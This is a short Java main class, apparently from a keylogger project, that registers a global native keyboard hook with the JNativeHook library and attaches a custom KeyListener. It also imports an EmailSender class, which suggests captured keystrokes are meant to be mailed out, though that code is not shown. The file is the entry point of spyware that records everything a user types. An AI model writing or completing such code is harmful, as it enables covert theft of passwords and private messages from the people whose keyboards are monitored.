package main;

import EmailSender.EmailSender;
import KeyListener.KeyListener;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;

public class Main {

    public static void main(String[] args) throws NativeHookException {
        GlobalScreen.registerNativeHook();

        KeyListener myKeyListener = new KeyListener();
        GlobalScreen.getInstance().addNativeKeyListener(myKeyListener);
    }

}
